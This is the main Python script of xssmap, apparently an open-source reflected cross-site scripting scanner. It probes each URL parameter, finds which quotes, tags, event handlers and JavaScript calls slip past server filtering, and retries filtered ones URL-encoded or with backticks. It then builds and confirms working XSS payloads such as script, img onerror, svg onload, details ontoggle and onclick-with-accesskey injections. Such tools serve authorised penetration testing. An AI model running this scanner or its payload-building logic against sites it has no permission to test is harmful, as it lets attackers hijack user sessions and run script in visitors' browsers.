#!/usr/bin/env python3
# coding=utf-8
# Author: Jewel591

from data import payloads, test_result
from lib import connect
from lib import format, lists
from lib import output
from lib.output import get_time
from lib import encoding
import random
import string
import re
import os
import signal
import sys
import threading
import time
import urllib.parse
import requests
from lib.argsparse import argsparse
from pip._vendor.distlib.compat import raw_input
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


START_TIME = END_TIME = ""


def main():
    """
       Main function of xssmap when running from command line.
    """

    global START_TIME, END_TIME
    START_TIME = time.time()
    print("\n[*] starting @ ", time.strftime("%H:%M:%S /%Y-%m-%d/\n"))

    if connect.checkUrlAccessibility() == 0:
        sys.exit()

    # Specify test parameters or not
    elif args.parameter:
        checkByParameter(args.parameter)
    else:
        allparameter = connect.getParameters()
        print(output.colour_blue(get_time()), output.colour_green("[INFO]"), "there are " + str(len(allparameter)) + " parameters detected from the input: ", end="")
        for key in allparameter.keys():
            print(key.strip(), end=" ")
        print("")
        for target_parameter in list(allparameter.keys()):
            checkByParameter(target_parameter)
    END_TIME = time.time()
    print("\n[*] ending @ ", time.strftime("%H:%M:%S /%Y-%m-%d/\n"))
    print("Time-consuming：", END_TIME - START_TIME)


def checkByParameter(parameter):
    test_result.target_parameter = parameter
    test_result.urldata_init()
    payloads.keyword_init()
    print(output.colour_blue(get_time()), output.colour_green("[INFO]"),
          "start testing parameter \'" + str(test_result.target_parameter) + '\'')
    xssmap = XssMap()
    if xssmap.checkInjectability() == 0:
        return 0
    else:
        xssmap.checkClosingString()
        xssmap.checkClosingTag()
        xssmap.checkJSFunction()
        xssmap.check_html_event()
        xssmap.checkHtmlTag()
        xssmap.check_combination_close_yes()
        xssmap.check_combination_close_no()
        xssmap.checkurlaccessibleInTheEnd()


class XssMap():
    def checkInjectability(self):
        """
        first test if the parameter can be injected
        """
        print(output.colour_blue(get_time()), output.colour_green("[INFO]"),
              "testing if the parameter \'" + str(test_result.target_parameter) + '\' is dynamic')
        salt_key = ''.join(
            random.sample(
                string.ascii_letters +
                string.digits,
                10))
        if connect.checkInjectabilityByPayload(salt_key) is 1:
            print(output.colour_blue(get_time()), output.colour_green_highlight("[INFO]"), "\033[1mparameter \'" + str(test_result.target_parameter) + '\' might be dynamic\033[0m')
            return 1
        elif connect.checkInjectabilityByPayload(salt_key) is 0:
            print(output.colour_blue(get_time()), output.colour_yellow(
                "[WARNING]"), "parameter \'" + str(test_result.target_parameter) + '\' might not be dynamic')
            return 0


    def checkClosingString(self):
        """
        Closing strings
        """
        threads = []
        maxthreads = 10
        sem = threading.Semaphore(maxthreads)
        print(output.colour_blue(get_time()), output.colour_green("[INFO]"),
              "testing for Reflection xss on parameter \'" + str(test_result.target_parameter) + '\'')

        def _worker(payload):
            sem.acquire()
            if connect.checkInjectabilityByPayload(payload) is 1:
                print(output.colour_blue(get_time()),output.colour_green("[INFO]"),'test shows that insertion success — ',payload.replace("591",""))
                test_result.whitelist['close'].append(payload)

            elif connect.checkInjectabilityByPayload(payload) is 0:
                if args.verbose:
                    print(output.colour_blue(get_time()), output.colour_green("[INFO]"),'test shows that server filtered - - ', payload.replace("591", ""))
                test_result.blacklist['close'].append(payload)
            sem.release()

        for payload in payloads.payloads['close']:
            t = threading.Thread(target=_worker, args=(payload,))
            threads.append(t)

        for thread in threads:
            while 1:
                if sem._value > 0:
                    thread.start()
                    break
        for t in threads:
            t.join()
        # the above tests filter common characters

        # 过滤的字符串 url 编码之后再测试
        threads.clear()
        if len(test_result.blacklist['close']) != 0:
            for payload_urlencode in encoding.urlencode_list(test_result.blacklist['close']):
                t = threading.Thread(target=_worker, args=(payload_urlencode,))
                threads.append(t)

            for thread in threads:
                while 1:
                    if sem._value > 0:
                        thread.start()
                        break
        for t in threads:
            t.join()
        threads.clear()

    def checkClosingTag(self):
        """
        Closing tags
        """
        threads = []
        maxthreads = 10
        sem = threading.Semaphore(maxthreads)
        threads.clear()
        def _worker(payload):
            sem.acquire()
            if connect.checkInjectabilityByPayload(payload) is 1:
                if payload.replace("591","") !=  "\"" and payload.replace("591","") != "'":
                    print(output.colour_blue(get_time()),output.colour_green("[INFO]"),'test shows that insertion success — ',payload.replace("591",""))
                test_result.whitelist['close_tag'].append(payload)

            elif connect.checkInjectabilityByPayload(payload) is 0:
                if args.verbose:
                    print(output.colour_blue(get_time()), output.colour_green("[INFO]"),'test shows that server filtered - - ', payload.replace("591", ""))
                test_result.blacklist['close_tag'].append(payload)
            sem.release()

        # 如果/未过滤，继续测试闭合标签
        if re.search("/|%2F", "".join(test_result.whitelist['close'])):

            if re.search("/", "".join(test_result.whitelist['close'])):
                pass
            if re.search("%2F", "".join(test_result.whitelist['close'])):
                payloads.payloads['close_tag'] = encoding.urlencode_list_AtoB(payloads.payloads['close_tag'],"/","%2F")
            if re.search("<", "".join(test_result.whitelist['close'])):
                pass
            if re.search("%3C", "".join(test_result.whitelist['close'])):
                payloads.payloads['close_tag'] = encoding.urlencode_list_AtoB(payloads.payloads['close_tag'],"<","%3C")
            if re.search(">", "".join(test_result.whitelist['close'])):
                pass
            if re.search("%3E", "".join(test_result.whitelist['close'])):
                payloads.payloads['close_tag'] = encoding.urlencode_list_AtoB(payloads.payloads['close_tag'],">","%3E")

            for payload in payloads.payloads['close_tag']:
                t = threading.Thread(target=_worker, args=(payload,))
                threads.append(t)
            for thread in threads:
                while 1:
                    if sem._value > 0:
                        thread.start()
                        break
            for t in threads:
                t.join()

        return


    def checkJSFunction(self):
        """
        Javascript Function Testing ...
        """
        threads = []
        maxthreads = 10
        sem = threading.Semaphore(maxthreads)
        threads.clear()
        def _worker(payload):

            # replace("\\\\\\\\","\\\\") 是因为 unicode
            # 编码之后，再使用urllib.parse.unquote（）会变成 8 个\，这时候正则匹配的是 4 个\，实际只需匹配 2
            # 个\，所以要做个replace
            if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(payload))).replace("\\\\\\\\", "\\\\"), connect.getResponseByPayload(payload)):
                print(output.colour_blue(get_time()), output.colour_green("[INFO]"),'test shows that insertion success - ', payload.replace("591", ""))
                test_result.whitelist['action'].append(payload)
            else:
                if args.verbose:
                    print(output.colour_blue(get_time()), output.colour_green("[INFO]"), 'test shows that server filtered - - ', payload.replace("591", ""))
                test_result.blacklist['action'].append(payload)

        # 执行线程
        for payload in payloads.payloads['action']:
            t = threading.Thread(target=_worker, args=(payload,))
            threads.append(t)
        for thread in threads:
            while 1:
                if sem._value > 0:
                    thread.start()
                    break
        for t in threads:
            t.join()

        # replace () to `, check again
        threads.clear()
        if len(test_result.blacklist['action']) != 0:

            test_result.blacklist['action'] = encoding.urlencode_list_AtoB(test_result.blacklist['action'],"(","`")
            test_result.blacklist['action'] = encoding.urlencode_list_AtoB(test_result.blacklist['action'], ")", "`")

            for payload_urlencode in test_result.blacklist['action']:
                t = threading.Thread(target=_worker, args=(payload_urlencode,))
                threads.append(t)

            for thread in threads:
                while 1:
                    if sem._value > 0:
                        thread.start()
                        break
        for t in threads:
            t.join()
        threads.clear()



        if test_result.whitelist['action']:
            test_result.signal['action'] = 'yes'
            return


# ON 事件测试


    def check_html_event(self):
        def startcheck(payload):
            if connect.checkInjectabilityByPayload(
                    payload) is 1:  # 使用 re.escape()
                print(output.colour_blue(get_time()), output.colour_green("[INFO]"),
                      'test shows that insertion success - ', payload.replace("591", ""))
                test_result.whitelist['onevent'].append(payload)
            else:
                if args.verbose:
                    print(
                        "[Failure]：", payload.replace("=591", ""))
                test_result.blacklist['onevent'].append(payload)

        for p in payloads.payloads['onevent']:
            mythread = threading.Thread(target=startcheck(p))
            mythread.start()

        # if test_result.blacklist['onevent']:
        #     test_result.signal['onevent'] = 'yes'

# 标签测试

    def checkHtmlTag(self):
        if ">" not in "".join(test_result.whitelist['close']) and "%3E" not in "".join(test_result.whitelist['close']):
            if "<" not in "".join(test_result.whitelist['close']) and "%3C" not in "".join(test_result.whitelist['close']):
                print('\033[32;8m[INFO] </> has beed forbid, no tag can injection. \033[0m')
                print(output.colour_blue(get_time()), output.colour_green("[INFO]"),
                      '< > has beed forbid, no tag can injection.')
                return
            else:
                pass

        if ">" not in "".join(test_result.whitelist['close']) and "%3E" in "".join(test_result.whitelist['close']):
            payloads.payloads['tag'] = format.payloadReplace(
                payloads.payloads['tag'], ">", "%3E")
            print(
                '\033[1;37;8m[!] > >>> %3E \033[0m')
        if "<" not in "".join(
                test_result.whitelist['close']) and "%3C" in "".join(
                test_result.whitelist['close']):
            payloads.payloads['tag'] = format.payloadReplace(
                payloads.payloads['tag'], "<", "%3C")
            print(
                '\033[1;37;8m[!] < >>> %3C \033[0m')

        def startcheck(payload):
            if connect.checkInjectabilityByPayload(payload) is 1:
                print(output.colour_blue(get_time()), output.colour_green("[INFO]"),
                      'test shows that insertion success - ', payload.replace("591", ""))
                test_result.whitelist['tag'].append(payload)
            else:
                if args.verbose:
                    print(
                        "[Failure]：", payload.replace("591", ""))
                test_result.blacklist['tag'].append(payload)

        for p in payloads.payloads['tag']:
            mythread = threading.Thread(target=startcheck(p))
            mythread.start()

        # if test_result.blacklist['tag']:
        #     test_result.signal['tag'] = 'yes'

        return


# 不闭合标签

    def check_combination_close_no(self):

        print(output.colour_blue(get_time()),output.colour_green("[INFO]"),
            "generating payload - unClosed Labels (-v for More Info)")


        str591 = ""
        for e in test_result.whitelist['close']:
            if e == "%22591" or e == "%27591" or e == "\"591" or e == "\'591":
                str591 += e.replace("591", "")
        # 对"和%22 去重
        if "%22" in str591 and "\"" in str591:
            str591 = str591.replace("%22", "")
        if "%27" in str591 and "\'" in str591:
            str591 = str591.replace("%27", "")

        if re.search(re.escape("onclick"),"".join(test_result.whitelist['onevent']),re.IGNORECASE) and re.search(re.escape("accesskey"),"".join(test_result.whitelist['onevent']),re.IGNORECASE):
            payloads.payloads['combination_close_no'].append(
                str591 +
                " " +
                "onclick=" +
                test_result.whitelist['action'][0] +
                " " +
                "AcCESsKeY=\"j\"" +
                " " +
                "nsf=" +
                str591)




        else:
            # print("\033[1;31m[INFO]\033[0m The combination of onclick and accesskey cannot be used. If the injection point is in the hidden attribute, it may not be triggered.")
            iiss = 1
            for e1 in test_result.whitelist['action']:
                for e2 in test_result.whitelist['onevent']:
                    if iiss < 2 and e2 != "AcCESsKeY=591":
                        if e2 == "oNcLIck=591" and "AcCESsKeY=591" in test_result.whitelist['onevent']:
                            iiss += 1
                            if "\"591" in test_result.whitelist['close']:
                                payloads.payloads['combination_close_no'].append(
                                    str591 +
                                    " " +
                                    e2.replace(
                                        "591",
                                        "") +
                                    e1 +
                                    " " +
                                    "AcCESsKeY=\"j\"" +
                                    " " +
                                    "nsf=" +
                                    str591)
                                break
                            if "'591" in test_result.whitelist['close']:
                                payloads.payloads['combination_close_no'].append(
                                    str591 +
                                    " " +
                                    e2.replace(
                                        "591",
                                        "") +
                                    e1 +
                                    " " +
                                    "AcCESsKeY='j'" +
                                    " " +
                                    "nsf=" +
                                    str591)
                                break
                            if "%22591" in test_result.whitelist['close']:
                                payloads.payloads['combination_close_no'].append(
                                    str591 +
                                    " " +
                                    e2.replace(
                                        "591",
                                        "") +
                                    e1 +
                                    " " +
                                    "AcCESsKeY=%22j%22" +
                                    " " +
                                    "nsf=" +
                                    str591)
                                break
                            if "%27591" in test_result.whitelist['close']:
                                payloads.payloads['combination_close_no'].append(
                                    str591 +
                                    " " +
                                    e2.replace(
                                        "591",
                                        "") +
                                    e1 +
                                    " " +
                                    "AcCESsKeY=%27j%27" +
                                    " " +
                                    "nsf=" +
                                    str591)
                            else:
                                payloads.payloads['combination_close_no'].append(
                                    str591 + " " + e2.replace("591", "") + e1 + " " + "nsf=" + str591)

                        else:
                            iiss += 1
                            payloads.payloads['combination_close_no'].append(
                                str591 + " " + e2.replace("591", "") + e1 + " " + "nsf=" + str591)
        try:
            if "/591" in test_result.whitelist['close']:
                payloads.payloads['combination_close_no'].append(
                    str591 + ";" + test_result.whitelist['action'][0] + "//")
            else:
                if "%2f591" in test_result.whitelist['close']:
                    payloads.payloads['combination_close_no'].append(
                        str591 + ";" + test_result.whitelist['action'][0] + "%2f%2f")
            if "/591" in test_result.whitelist['close']:
                payloads.payloads['combination_close_no'].append(
                    str591 + ";}" + test_result.whitelist['action'][0] + ";{//")
            else:
                if "%2f591" in test_result.whitelist['close']:
                    payloads.payloads['combination_close_no'].append(
                        str591 + ";});" + test_result.whitelist['action'][0] + ";{%2f%2f")

            if "/591" in test_result.whitelist['close']:
                payloads.payloads['combination_close_no'].append(
                    str591 + ";});" + test_result.whitelist['action'][0] + ";$(function(){//")
            else:
                if "%2f591" in test_result.whitelist['close']:
                    payloads.payloads['combination_close_no'].append(
                        str591 + ";});" + test_result.whitelist['action'][0] + ";$(function(){%2f%2f")
        except BaseException:
            pass


        # 判断是否onevent 和 action 都被[Failure]

        # if test_result.signal['action'] == test_result.signal['onevent'] == 'no':
        if len(test_result.whitelist['action'])==0 and len(test_result.whitelist['onevent'])==0:
            print(output.colour_blue(get_time()),
                "\033[1;31m[WARNING]\033[0m " +
                "No payload available " +
                "\n")

        if len(payloads.payloads['combination_close_no']) == 0:
            print(output.colour_blue(get_time()),
                "\033[1;31m[INFO]\033[0m " +
                "No payload available " +
                "\n")
            return
        else:
            print(output.colour_blue(get_time()), output.colour_green("[INFO]"),"Finish generated " +
                  str(len(payloads.payloads['combination_close_no'])) +
                " payloads")
            if args.verbose:
                for erer in payloads.payloads['combination_close_no']:
                    print(
                        "Payload: " +
                        erer)
                # time.sleep(0.1)
            # format.breakline()
            # print(output.colour_blue(get_time()), output.colour_green("[INFO]"),
            #       'test shows that insertion success for ', '\'', payload.replace("591", ""), '\'')

            # print("xssmap identified the following payload for parameter '"+str(urldata.target_parameter)+"\' (reflection xss):")
            print("xssmap identified the following payload(s) (reflection xss) - unClosed Labels:")
            print("---")
            print("Parameter:", test_result.target_parameter)
        #
        def startcheck(payload):
            if re.search(
                re.escape(
                    urllib.parse.unquote(
                        urllib.parse.unquote(payload))).replace(
                    " ",
                    ".*").replace(
                    "\\\\\\\\",
                    "\\\\").replace(
                        "\\.*",
                        ".*"),
                connect.getResponseByPayload(
                    payload)):  # 使用 re.escape()
                test_result.whitelist['combination_close_no'].append(payload)

                print("\033[37;8m    ", payload + "\033[0m")
            else:
                if args.verbose:
                    print(
                        "[Failure]：", payload.replace("591", ""))
                test_result.blacklist['combination_close_no'].append(payload)

        for p in payloads.payloads['combination_close_no']:
            mythread = threading.Thread(target=startcheck(p))
            mythread.start()
        return

# 闭合测试

    def check_combination_close_yes(self):

        print(output.colour_blue(get_time()),output.colour_green("[INFO]"),
            "generating payload - Closed Labels (-v for More Info..)")

        if test_result.signal['action'] == test_result.signal['onevent'] == 'no':
            print(
                "[!] 弹窗函数 和 ON事件 全被[Failure]，不可弹窗，故不再做组合测试".center(7))
            return  # return 退出整个函数
        # 构造 payload

        str592 = ""
        for e in test_result.whitelist['close']:
            if e == "%22591" or e == "%27591" or e == "\"591" or e == "\'591" or e == "/591" or e == "%2f591" or e == ">591" or e == "%3E591":
                str592 += e.replace("591", "")
        if re.search(
                re.escape("script"),
                "".join(
                    test_result.whitelist['tag']),
                re.IGNORECASE):
            str592 = "</ScRipt>" + str592
        pdd = test_result.whitelist['tag'][:]
        for pd in pdd:
            if "/" not in pd and pd.replace("591",
                                            "").replace(" ",
                                                        "") + "/591" in test_result.whitelist['tag']:
                test_result.whitelist['tag'].remove(pd)

        if ">" not in "".join(
                test_result.whitelist['tag']) and "%3E" in "".join(
            test_result.whitelist['close']):
            payloads.payloads['combination_close_yes'] = format.payloadReplace(
                payloads.payloads['combination_close_yes'], ">", "%3E")

        for e1 in test_result.whitelist['tag']:
            try:
                if re.search(re.escape("script"), e1, re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 + "<ScRipt>" + test_result.whitelist['action'][0] + "</ScRipt>")

                if re.search(re.escape("<a>"), e1, re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 +
                        "<A" +
                        " " +
                        test_result.whitelist['onevent'][0].replace(
                            "591",
                            "") +
                        test_result.whitelist['action'][0] +
                        ">" +
                        "591</A>")

                if re.search(re.escape("input/"), e1, re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 +
                        "<iNpUt" +
                        "/" +
                        test_result.whitelist['onevent'][0].replace(
                            "591",
                            "") +
                        test_result.whitelist['action'][0] +
                        "%20")
                elif re.search(re.escape("input"), e1, re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 +
                        "<iNpUt" +
                        " " +
                        test_result.whitelist['onevent'][0].replace(
                            "591",
                            "") +
                        test_result.whitelist['action'][0] +
                        "%20")

                if re.search(re.escape("textarea"), e1, re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 +
                        "<teXtaReA" +
                        "/" +
                        test_result.whitelist['onevent'][0].replace(
                            "591",
                            "") +
                        test_result.whitelist['action'][0] +
                        "%20")
                elif re.search(re.escape("textarea"), e1, re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 +
                        "<teXtaReA" +
                        " " +
                        test_result.whitelist['onevent'][0].replace(
                            "591",
                            "") +
                        test_result.whitelist['action'][0] +
                        "%20")

                if re.search(re.escape("select"), e1, re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 +
                        "<select" +
                        "/" +
                        test_result.whitelist['onevent'][0].replace(
                            "591",
                            "") +
                        test_result.whitelist['action'][0] +
                        "%20")
                elif re.search(re.escape("select"), e1, re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 +
                        "<select" +
                        " " +
                        test_result.whitelist['onevent'][0].replace(
                            "591",
                            "") +
                        test_result.whitelist['action'][0] +
                        "%20")

                if re.search(
                        re.escape("video"),
                        e1,
                        re.IGNORECASE) and re.search(
                    re.escape("onerror"),
                    "".join(
                        test_result.whitelist['onevent']),
                    re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 + "<video><source" + "/" + "oNErroR=" + test_result.whitelist['action'][0] + "%20")
                elif re.search(re.escape("video"), e1, re.IGNORECASE) and re.search(re.escape("onerror"),
                                                                                    "".join(test_result.whitelist[
                                                                                                'onevent']),
                                                                                    re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 + "<video><source" + " " + "oNErroR=" + test_result.whitelist['action'][0] + "%20")

                if re.search(
                        re.escape("img"),
                        e1,
                        re.IGNORECASE) and re.search(
                    re.escape("src"),
                    "".join(
                        test_result.whitelist['onevent']),
                    re.IGNORECASE) and re.search(
                    re.escape("onerror"),
                    "".join(
                        test_result.whitelist['onevent']),
                    re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 +
                        "<ImG" +
                        "/" +
                        "src=x" +
                        "/" +
                        "OnErrOr=" +
                        test_result.whitelist['action'][0] +
                        "%20")
                elif re.search(re.escape("img"), e1, re.IGNORECASE) and re.search(re.escape("src"),
                                                                                  "".join(test_result.whitelist[
                                                                                              'onevent']),
                                                                                  re.IGNORECASE) and re.search(
                    re.escape("onerror"), "".join(test_result.whitelist['onevent']), re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 +
                        "<ImG" +
                        " " +
                        "src=x" +
                        " " +
                        "OnErrOr=" +
                        test_result.whitelist['action'][0] +
                        "%20")

                if re.search(
                        re.escape("audio"),
                        e1,
                        re.IGNORECASE) and re.search(
                    re.escape("src"),
                    "".join(
                        test_result.whitelist['onevent']),
                    re.IGNORECASE) and re.search(
                    re.escape("onerror"),
                    "".join(
                        test_result.whitelist['onevent']),
                    re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 +
                        "<AuDiO" +
                        "/" +
                        "src=x" +
                        "/" +
                        "OnErrOr=" +
                        test_result.whitelist['action'][0] +
                        "%20")
                elif re.search(re.escape("audio"), e1, re.IGNORECASE) and re.search(re.escape("src"),
                                                                                    "".join(test_result.whitelist[
                                                                                                'onevent']),
                                                                                    re.IGNORECASE) and re.search(
                    re.escape("onerror"), "".join(test_result.whitelist['onevent']), re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 +
                        "<AuDiO" +
                        " " +
                        "src=x" +
                        " " +
                        "OnErrOr=" +
                        test_result.whitelist['action'][0] +
                        "%20")

                if re.search(
                        re.escape("details"),
                        e1,
                        re.IGNORECASE) and re.search(
                    re.escape("ontoggle"),
                    "".join(
                        test_result.whitelist['onevent']),
                    re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 + "<DeTaIlS" + "/" + "oNToGgle=" + test_result.whitelist['action'][0] + "%20")
                elif re.search(re.escape("details"), e1, re.IGNORECASE) and re.search(re.escape("ontoggle"),
                                                                                      "".join(test_result.whitelist[
                                                                                                  'onevent']),
                                                                                      re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 + "<DeTaIlS" + " " + "oNToGgle=" + test_result.whitelist['action'][0] + "%20")

                if re.search(
                        re.escape("body"),
                        e1,
                        re.IGNORECASE) and re.search(
                    re.escape("onload"),
                    "".join(
                        test_result.whitelist['onevent']),
                    re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 + "<BoDy" + "/" + "oNLoAd=" + test_result.whitelist['action'][0] + "%20")
                elif re.search(re.escape("body"), e1, re.IGNORECASE) and re.search(re.escape("onload"),
                                                                                   "".join(test_result.whitelist[
                                                                                               'onevent']),
                                                                                   re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 + "<BoDy" + " " + "oNLoAd=" + test_result.whitelist['action'][0] + "%20")

                if re.search(
                        re.escape("svg"),
                        e1,
                        re.IGNORECASE) and re.search(
                    re.escape("onload"),
                    "".join(
                        test_result.whitelist['onevent']),
                    re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 + "<SvG" + "/" + "oNLoAd=" + test_result.whitelist['action'][0] + "%20")
                elif re.search(re.escape("svg"), e1, re.IGNORECASE) and re.search(re.escape("onload"),
                                                                                  "".join(test_result.whitelist[
                                                                                              'onevent']),
                                                                                  re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 + "<SvG" + " " + "oNLoAd=" + test_result.whitelist['action'][0] + "%20")

                if re.search(
                        re.escape("iframe"),
                        e1,
                        re.IGNORECASE) and re.search(
                    re.escape("onload"),
                    "".join(
                        test_result.whitelist['onevent']),
                    re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 + "<IfrAme" + "/" + "oNLoAd=" + test_result.whitelist['action'][0] + "%20")
                elif re.search(re.escape("iframe"), e1, re.IGNORECASE) and re.search(re.escape("onload"),
                                                                                     "".join(test_result.whitelist[
                                                                                                 'onevent']),
                                                                                     re.IGNORECASE):
                    payloads.payloads['combination_close_yes'].append(
                        str592 + "<IfrAme" + " " + "oNLoAd=" + test_result.whitelist['action'][0] + "%20")

                # 用/代替空格

                # if re.search(re.escape("input"), e1, re.IGNORECASE):
                #     payload.keyword['combination_close_yes'].append(
                #         str592+"<iNpUt"+"/"+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")
                #
                # if re.search(re.escape("textarea"), e1, re.IGNORECASE):
                #     payload.keyword['combination_close_yes'].append(
                # str592+"<teXtaReA"+"/"+urldata.unsensitive['onevent'][0].replace("591",
                # "")+urldata.unsensitive['action'][0]+">")

                # if re.search(re.escape("select"), e1, re.IGNORECASE):
                #     payload.keyword['combination_close_yes'].append(
                # str592+"<select"+"/"+urldata.unsensitive['onevent'][0].replace("591",
                # "")+urldata.unsensitive['action'][0]+">")

                # if re.search(re.escape("video"), e1, re.IGNORECASE)and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                #     payload.keyword['combination_close_yes'].append(
                # str592 + "<video><source" + "/" + "oNErroR="
                # +urldata.unsensitive['action'][0] + ">")

                # if re.search(re.escape("img"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                #     payload.keyword['combination_close_yes'].append(
                # str592 + "<ImG" + "/" + "src=x" + "/" + "OnErrOr=" +
                # urldata.unsensitive['action'][0] + ">")

                # if re.search(re.escape("audio"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                #     payload.keyword['combination_close_yes'].append(
                #         str592 + "<AuDiO" + "/" + "src=x" + "/" + "OnErrOr=" + urldata.unsensitive['action'][0] + ">")
                #
                # if re.search(re.escape("details"), e1, re.IGNORECASE) and re.search(re.escape("ontoggle"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                #     payload.keyword['combination_close_yes'].append(
                #         str592 + "<DeTaIlS" + "/" + "oNToGgle=" + urldata.unsensitive['action'][0] + ">")
                #
                # if re.search(re.escape("body"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                #     payload.keyword['combination_close_yes'].append(
                # str592 + "<BoDy" + "/" + "oNLoAd=" +
                # urldata.unsensitive['action'][0] + ">")

                # if re.search(re.escape("svg"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                #     payload.keyword['combination_close_yes'].append(
                #         str592 + "<SvG" + "/" + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")
                #
                # if re.search(re.escape("iframe"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                #     payload.keyword['combination_close_yes'].append(
                # str592 + "<IfrAme" + "/" + "oNLoAd=" +
                # urldata.unsensitive['action'][0] + ">")
            except BaseException:
                pass

        if ">" not in "".join(
                test_result.whitelist['close']) and "%3E" in "".join(
                test_result.whitelist['close']):
            payloads.payloads['combination_close_yes'] = format.payloadReplace(
                payloads.payloads['combination_close_yes'], ">", "%3E")
        if "<" not in "".join(
                test_result.whitelist['close']) and "%3C" in "".join(
                test_result.whitelist['close']):
            payloads.payloads['combination_close_yes'] = format.payloadReplace(
                payloads.payloads['combination_close_yes'], "<", "%3C")
        if ">" not in "".join(
                test_result.whitelist['close']) and "%3E" not in "".join(
                test_result.whitelist['close']):
            payloads.payloads['combination_close_yes'] = format.payloadReplace(
                payloads.payloads['combination_close_yes'], ">", "%20")

        if len(payloads.payloads['combination_close_yes']) == 0:
            print(
                "\033[1;31m[INFO]\033[0m " +
                "No payload available " +
                "\n")
            return
        else:
            print(output.colour_blue(get_time()), output.colour_green("[INFO]"), "Finish generated " +
                  str(len(payloads.payloads['combination_close_yes'])) +
                " payloads")
            if args.verbose:
                for erer in payloads.payloads['combination_close_yes']:
                    print(
                        "Payload: ", erer)
            # format.breakline()
            print("xssmap identified the following payload(s) (reflection xss) - Closed Label:")
            print("---")
            print("Parameter:", test_result.target_parameter)

        def startcheck(payload):
            if re.search(
                re.escape(
                    urllib.parse.unquote(
                        urllib.parse.unquote(payload))).replace(
                    r"\ ",
                    ".*"),
                connect.getResponseByPayload(
                    payload)):  # 使用 re.escape()
                test_result.whitelist['combination_close_yes'].append(payload)
                print("\033[37;8m    ", payload + "\033[0m")
            else:
                if args.verbose:
                    print(
                        "[Failure]：", payload)
                test_result.blacklist['combination_close_yes'].append(payload)

        for p in payloads.payloads['combination_close_yes']:
            mythread = threading.Thread(target=startcheck(p))
            mythread.start()

        return

# waf checking

    def checkurlaccessibleInTheEnd(self):
        print(output.colour_blue(get_time()), output.colour_green("[INFO]"),
              'testing websites for waf protection')
        while len(test_result.blacklist['close']) < 1:
            return
        self.security_strategy = 0

        def startcheck(payload):
            if re.search(
                re.escape(
                    urllib.parse.unquote(
                        urllib.parse.unquote(payload))), connect.getResponseByPayload(
                    payload)):  # 使用 re.escape()
                pass
            else:
                self.security_strategy += 1
                if self.security_strategy > 1:
                    print(output.colour_blue(get_time()), output.colour_red("[ERROR]"),"may have waf devices, test results are inaccurate.")
        for i in test_result.blacklist['close']:
            if self.security_strategy < 2:
                startcheck(i)
            else:
                pass
        if self.security_strategy < 2:
            pass
        return

# ctrl 信号捕获函数


def exit_gracefully(signum, frame):
    signal.signal(signal.SIGINT, original_sigint)

    try:
        raw_input("\n\033[1;34;8m[!] pause! Press Enter to continue > \033[0m")

    except KeyboardInterrupt:
        print("\n\033[1;34;8m[!] Exiting... \033[0m")
        time.sleep(0.3)
        print("\n\033[1;34;8m[!] GoodBye！ \033[0m")
        os._exit(0)

    # restore the exit gracefully handler here
    signal.signal(signal.SIGINT, exit_gracefully)


if __name__ == "__main__":
    args = argsparse().args()
    print(
        "======================================================================================\n"
        "xssmap v0.1.2 by Jewel591\n"
        "About Me: https://www.github.com/jewel591\n"
        # "update time: 20200730\n"
        "======================================================================================\n"
        " Url:       ", " ".ljust(15), args.url, "\n"
        " Post DATA: ", " ".ljust(15), args.postdata, "\n"
        " Parameter: ", " ".rjust(15), args.parameter, "\n"
        " Cookie:    ", " ".rjust(15), args.cookie, "\n"
        " UserAgent: ", " ".rjust(15), args.useragent, "\n"
        " Timeout:   ", " ".rjust(15), args.timeout, "\n"
        " Verbose:   ", " ".rjust(15), args.verbose, "\n"
        " Proxy:     ", " ".rjust(15), args.proxy, "\n"
        "======================================================================================")
    # print("\n[*] starting @ ", time.strftime("%H:%M:%S /%Y-%m-%d/\n"))
    # time.strftime("%Y-%m-%d /%H:%M:%S/", time.localtime())

    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
    main()
